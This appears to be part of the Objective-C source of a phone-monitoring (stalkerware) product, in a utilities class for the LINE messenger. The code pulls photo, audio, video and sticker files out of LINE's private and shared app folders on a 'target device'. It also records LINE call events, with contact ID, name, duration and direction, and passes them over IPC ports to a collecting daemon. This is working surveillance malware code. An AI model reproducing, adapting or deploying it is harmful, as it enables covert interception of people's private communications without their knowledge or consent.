#pragma mark Audio, Photo, Video attachment (public method)

+ (FxAttachment *) attachment: (NSData *) aActualData thumbnail: (NSData *) aThumbnailData extension: (NSString *) aExtension {
    FxAttachment *attachment = nil;
    NSString* lineAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imLine/"];
    lineAttachmentPath = [LINEUtils getOutputPath:lineAttachmentPath extension:aExtension];
//    DLog (@"lineAttachmentPath, %@", lineAttachmentPath);
//    DLog (@"aActualData, %@", aActualData);
//     DLog (@"aThumbnailData, %@", aThumbnailData);
    if (aActualData && aThumbnailData) {
        if (![aActualData writeToFile:lineAttachmentPath atomically:YES]) {
            // iOS 9, Sandbox
            lineAttachmentPath = [IMShareUtils saveData:aActualData toDocumentSubDirectory:@"/attachments/imLine/" fileName:[lineAttachmentPath lastPathComponent]];
        }
        attachment = [[[FxAttachment alloc] init] autorelease];
        [attachment setFullPath:lineAttachmentPath];
        [attachment setMThumbnail:aThumbnailData];
    } else {
        // No thumbnail
        if (aActualData) {
            if (![aActualData writeToFile:lineAttachmentPath atomically:YES]) {
                // iOS 9, Sandbox
                lineAttachmentPath = [IMShareUtils saveData:aActualData toDocumentSubDirectory:@"/attachments/imLine/" fileName:[lineAttachmentPath lastPathComponent]];
            }
            attachment = [[[FxAttachment alloc] init] autorelease];
            [attachment setFullPath:lineAttachmentPath];
        }
        
        // No actual
        if (aThumbnailData) {
            attachment = [[[FxAttachment alloc] init] autorelease];
            NSString *mimeType = nil;
            if ([aExtension isEqualToString:@"m4a"]) {
                mimeType = @"audio/mp4";
            } else if ([aExtension isEqualToString:@"jpg"]) {
                mimeType = @"image/jpeg";
            } else if ([aExtension isEqualToString:@"mp4"]) {
                mimeType = @"video/MOV";
            } else {
                mimeType = @"video/MOV";
            }
            [attachment setFullPath:mimeType];
            [attachment setMThumbnail:aThumbnailData];
        }
    }
    return (attachment);
}

#pragma mark Sticker Utils

+ (NSString *) findStickerFolderNameForStickerPackageID: (NSString *) aStickerPackageID stickerPackagesPath: (NSString *) aStickerPackagesPath {
	NSString *stickerFolder = nil;
	NSArray *stickerPackages	= [[NSFileManager defaultManager] contentsOfDirectoryAtPath:aStickerPackagesPath error:nil];	
	
	for (NSString *eachStickerPackage in stickerPackages) {
		NSString *stickerPackagesPath = [NSString stringWithFormat:@"%@/%@", aStickerPackagesPath, eachStickerPackage];		
		NSString *searchedStr					= [[NSString alloc] initWithFormat:@"%@.", aStickerPackageID];
		NSRange range							= [[stickerPackagesPath lowercaseString] rangeOfString:searchedStr];
		[searchedStr release];
		
		DLog(@"stickerPackagesPath %@", stickerPackagesPath);
		
		if (range.location != NSNotFound	&& range.length != 0) {					// Match package id
			DLog (@"found package %@", eachStickerPackage)
			stickerFolder = eachStickerPackage;
			break;
		}
	}	
	return stickerFolder;	
}

/**********************************************************
	Return value can be either one of these
		1) APP/Library/Application Support/Sticker Packages/xxx.y.linestk/
		2) APP/Library/Caches/Stray Sticker Packages/xxx.y.linestk/
		3) nil
 ***********************************************************/
+ (NSString *) getStickerFolderPathForPackageIDIfExist: (NSString *) aStickerPackageID {
	NSString *stickerFolder = nil;
	NSString *stickerFolderPath = nil;
	/*********************************************
	 * STEP 1: Find in Library (Downloaded Packages) first
	 *********************************************/
	
	// Match only package id if only one package id exist
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);										// --> APP/Library/
	
	if ([paths count] == 1) {
		NSString *stickerPackagePaths		= [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineDownloadedStickerPath];			// --> APP/Library/Application Support/Sticker Packages		
		stickerFolder = [LINEUtils findStickerFolderNameForStickerPackageID:aStickerPackageID												
														stickerPackagesPath:stickerPackagePaths];
		if (stickerFolder)
			stickerFolderPath = [stickerPackagePaths stringByAppendingPathComponent:stickerFolder];											// --> APP/Library/Application Support/Sticker Packages/xxx.y.linestk/
	}

	/*********************************************
	 * STEP 2: If not found the folder name in Library, find in INCOMING sticker folder
	 *********************************************/
	
	if (!stickerFolder) {
		NSString *stickerPackagePaths		= [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineIncomingStickerPath];			// --> APP/Library/Caches/Stray Sticker Packages/
		
		stickerFolder = [LINEUtils findStickerFolderNameForStickerPackageID:aStickerPackageID										
														stickerPackagesPath:stickerPackagePaths];
		if (stickerFolder)
			stickerFolderPath = [stickerPackagePaths stringByAppendingPathComponent:stickerFolder];												// --> APP/Library/Caches/Stray Sticker Packages/xxx.y.linestk/
	}
	
	return stickerFolderPath;
}


+ (NSData *) getStickerDataForStickerID: (NSInteger) aStickerID
					   stickerPackageID: (NSString *) aStickerPackageID
				  stickerPackageVersion: (unsigned) aStickerPackageVersion {
	
	/*********************************************
	 * STEP 1: Find Sticker Folder Path
	 *		e.g., 788.3.linestk
	 *********************************************/
	
	NSString *stickerFolderPath = nil;
	
	/**************************************************************************************************
	 * CASE 1: For outgoing and incoming sticker whose package has been "DOWNLOADED" to Target device 
			   For "DEFAULT" Sticker
	 * CASE 2: For incoming sticker whose package has NOT been dowloaded
	 **************************************************************************************************/	
	
	// CASE 1: Know package version
	if (aStickerPackageID && aStickerPackageVersion) {	
		DLog (@"Known Packaged ID and Package Version")	
		
		NSString *stickerFolder = [NSString stringWithFormat:@"%@.%d.linestk", aStickerPackageID, aStickerPackageVersion];	
		
		// -- Not Default Sticker
		// Search in Downloaded folder and Incoming folder
		if ([aStickerPackageID intValue] != 1) {
			// -- Find in Downloaded folder
			NSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);								// --> APP/Library			
			if ([paths count] == 1) {
				stickerFolderPath = [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineDownloadedStickerPath];					// --> APP/Library/Application Support/Sticker Package/					
				stickerFolderPath = [stickerFolderPath stringByAppendingPathComponent:stickerFolder];										// --> APP/Library/Application Support/Sticker Package/xxx.y.linestk/					
				DLog (@"Non Default Sticker Path in Downloaded folder %@", stickerFolderPath)
			}
			// -- Find in Incoming Sticker (Stray Sticker Packages)
			if (![[NSFileManager defaultManager] fileExistsAtPath:stickerFolderPath]) {								
				NSString *stickerPackagePaths		= [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineIncomingStickerPath];	// --> APP/Library/Caches/Stray Sticker Packages/
				stickerFolderPath = [stickerPackagePaths stringByAppendingPathComponent:stickerFolder];										// --> APP/Library/Caches/Stray Sticker Packages/xxx.y.linestk/
				DLog (@"Non Default Sticker Path in Incoming folder %@", stickerFolderPath)				
			}		
			if (![[NSFileManager defaultManager] fileExistsAtPath:stickerFolderPath])
				stickerFolderPath = nil;
            
            // LINE 5.1.0 & 5.1.1 store downloaded sticker in shared app group
            if (!stickerFolderPath) {
                DLog(@"path a, %@", NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES));
                DLog(@"path b, %@", NSSearchPathForDirectoriesInDomains(NSSharedPublicDirectory, NSUserDomainMask, YES));
                
                NSFileManager *fileManager = [NSFileManager defaultManager];
                NSURL *url = [fileManager containerURLForSecurityApplicationGroupIdentifier:@"group.com.linecorp.line"];
                DLog(@"url c, %@", url);                                                                                                // file:///private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563/
                
                stickerFolderPath = [url path];                                                                                         // /private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563
                stickerFolderPath = [stickerFolderPath stringByAppendingString:@"/Library/Application Support/Sticker Packages/"];
                stickerFolderPath = [stickerFolderPath stringByAppendingString:stickerFolder];
                stickerFolderPath = [stickerFolderPath stringByAppendingString:@"/"];
                
                DLog (@"Non Default Sticker Path in Downloaded folder of shared AppGroup %@", stickerFolderPath)
            }
		} 
		// -- Default Sticker
		else {
			// Search in LINE.app folder
			NSString *appFolderPath = [[NSBundle mainBundle] resourcePath];																// --> APP/LINE.app/
			// + /Sticker Packages/1.100.linestk		 
			stickerFolderPath = [appFolderPath stringByAppendingPathComponent:@"Sticker Packages"];										// --> APP/LINE.app/Sticker Packages/
			stickerFolderPath = [stickerFolderPath stringByAppendingPathComponent:stickerFolder];										// --> APP/LINE.app/Sticker Packages/xxx.y.linestk/
			DLog (@"Default Sticker Path %@", stickerFolderPath)
			if (![[NSFileManager defaultManager] fileExistsAtPath:stickerFolderPath])
				stickerFolderPath = nil;
		}				
	} 
	// CASE 2: Don't know package version
	else {												
		// Search in Downloaded folder and Incoming folder
		stickerFolderPath = [LINEUtils getStickerFolderPathForPackageIDIfExist:aStickerPackageID];												// --> APP/Library/Application Support/Sticker Packages/xxx.y.linestk/
																																		// --> APP/Library/Caches/Stray Sticker Packages/xxx.y.linestk/
																																		// --> nil
		DLog (@"Downloaded/Stray Sticker Path %@", stickerFolderPath)
	}
			
	/*********************************************
	 * STEP 2: Find Sticker Filename
	 *		e.g., 10814@2x.png
	 *********************************************/		
	
	NSString *stickerFileName	= [[NSString alloc] initWithFormat:@"%ld@2x.png", (long)aStickerID];	// found on LINE version 3.5.1 4S
	NSString *stickerFileName2	= [[NSString alloc] initWithFormat:@"%ld.png", (long)aStickerID];	// found on LINE version 3.5.1 3GS
	
	/*********************************************
	 * STEP 3: Find Sticker Full Path
	 *********************************************/		
	NSData *stickerData			= nil;			
					
	if (stickerFolderPath) {	
		NSString *stickerFullPath = [stickerFolderPath stringByAppendingPathComponent:stickerFileName];
		DLog (@"stickerFullPath 1: %@", stickerFullPath)
		
		if ([[NSFileManager defaultManager] fileExistsAtPath:stickerFullPath])	{	// @2x.png
			UIImage *stickerImage = [[UIImage alloc] initWithContentsOfFile:stickerFullPath];
			//[UIImagePNGRepresentation(stickerImage) writeToFile:@"/tmp/sticker.png" atomically:YES];
			stickerData = UIImagePNGRepresentation(stickerImage);	
			[stickerImage release];
		}
		else {																		// .png
			stickerFullPath = [stickerFolderPath stringByAppendingPathComponent:stickerFileName2];
			DLog (@"stickerFullPath 2: %@", stickerFullPath)
			UIImage *stickerImage = [[UIImage alloc] initWithContentsOfFile:stickerFullPath];
			stickerData = UIImagePNGRepresentation(stickerImage);	
			[stickerImage release];
		}
	}
	
	[stickerFileName release];
	[stickerFileName2 release];
	
	return stickerData;
}

+ (FxAttachment *) createStickerAttachment: (NSData *) aStickerData {	
	// -- create FxAttachment
	FxAttachment *attachment = [[FxAttachment alloc] init];
	[attachment setMThumbnail:aStickerData];
	return [attachment autorelease];
}


#pragma mark -
#pragma mark VoIP
#pragma mark -


#pragma mark VoIP (public method)


+ (void) sendLINEVoIPEvent: (FxVoIPEvent *) aVoIPEvent {	
	DLog (@"sendLINEVoIPEvent")
	LINEUtils *lineUtils = [[LINEUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(voIPthread:)
							 toTarget:lineUtils 
						   withObject:aVoIPEvent];
	[lineUtils autorelease];	
	
}

+ (FxVoIPEvent *) createLINEVoIPEventForContactID: (NSString *) aContactID
									  contactName: (NSString *) aContactName
										 duration: (NSInteger) aDuration
										direction: (FxEventDirection) aDirection {
	// -- create FxVoIPEvent		
	FxVoIPEvent *voIPEvent	= [[FxVoIPEvent alloc] init];	
	[voIPEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[voIPEvent setEventType:kEventTypeVoIP];															
	[voIPEvent setMCategory:kVoIPCategoryLINE];	
	[voIPEvent setMDirection:aDirection];
	[voIPEvent setMDuration:aDuration];			
	[voIPEvent setMUserID:aContactID];										// participant id 
	[voIPEvent setMContactName:aContactName];								// participant displayname
	[voIPEvent setMTransferedByte:0];
	[voIPEvent setMVoIPMonitor:kFxVoIPMonitorNO];
	[voIPEvent setMFrameStripID:0];				
	
	return [voIPEvent autorelease];
}


#pragma mark VoIP (private method)


- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		
		NSMutableData* data			= [[NSMutableData alloc] init];
		
		NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		[archiver encodeObject:aVoIPEvent forKey:kLINEArchived];
		[archiver finishEncoding];
		[archiver release];	
		
		// -- first port ----------
		BOOL sendSuccess = [LINEUtils sendDataToPort:data portName:kLINECallLogMessagePort1];
		if (!sendSuccess){
			DLog (@"First attempt fails %@", aVoIPEvent)
			
			// -- second port ----------
			sendSuccess = [LINEUtils sendDataToPort:data portName:kLINECallLogMessagePort2];
			if (!sendSuccess) {
				DLog (@"Second attempt fails %@", aVoIPEvent)
				
				[NSThread sleepForTimeInterval:1];
				
				// -- Third port ----------				
				sendSuccess = [LINEUtils sendDataToPort:data portName:kLINECallLogMessagePort3];						
				if (!sendSuccess) {
					DLog (@"LOST LINE VoIP event %@", aVoIPEvent)
				}
			}
		}			
		[data release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}


+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		if ([aPortName isEqualToString:kLINEMessagePort1]	||
			[aPortName isEqualToString:kLINEMessagePort2]	||
			[aPortName isEqualToString:kLINEMessagePort3]	) {
			sharedFileSender = [[LINEUtils shareLINEUtils] mIMSharedFileSender];
		} else {
			sharedFileSender = [[LINEUtils shareLINEUtils] mVOIPSharedFileSender];
		}
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}


//+ (NSString *) createVCardStringForLINEName: (NSString *) aLINEName
//									 lineID: (NSString *) aLINEID {
//	DLog (@"LINE contact --> createVCardStringForLINEName")
//	
//	ABRecordRef adbRecord		= ABPersonCreate();
//
//	DLog (@"!!!!!!!		line id %@",	aLINEID)
//	DLog (@"!!!!!!!		line Name %@",	aLINEName)
//	
//	NSString *note				= [[NSString alloc] initWithFormat:@"LINE ID %@", aLINEID];
//		
//	DLog (@">>>> note %@", note)
//	CFErrorRef error				= NULL;
//	BOOL canSetNote = ABRecordSetValue(adbRecord, kABPersonNoteProperty, note, &error);		
//	
//	DLog (@"canSetNote %d", canSetNote)
//	ABRecordSetValue(adbRecord, kABPersonFirstNameProperty, aLINEName , &error);
//   
//	NSData *aVCardData			= [ABVCardExporter _vCard30RepresentationOfRecords:[NSArray arrayWithObject:(id)adbRecord]];		
//	NSString *vCardString		= [[NSString alloc] initWithData:aVCardData encoding:NSUTF8StringEncoding];
//	NSLog(@"---> vCardString %@", vCardString);
//	
//	CFRelease(adbRecord);
//	//[note release];
//	
//	return [vCardString autorelease];	
//}

- (void) dealloc {
	DLog (@"dealloc of LINEUtils")
	[mLineEventSenderQueue cancelAllOperations];
	[mLineEventSenderQueue release];
    [mLineVideoDownloadQueue cancelAllOperations];
    [mLineVideoDownloadQueue release];
	[mOutgoingMessageArray release];
	[mOutgoingMessageObjectArray release];
	[mOutgoingMessageDictionary release];
	[mIMSharedFileSender release];
	[mVOIPSharedFileSender release];
	[super dealloc];
}


@end
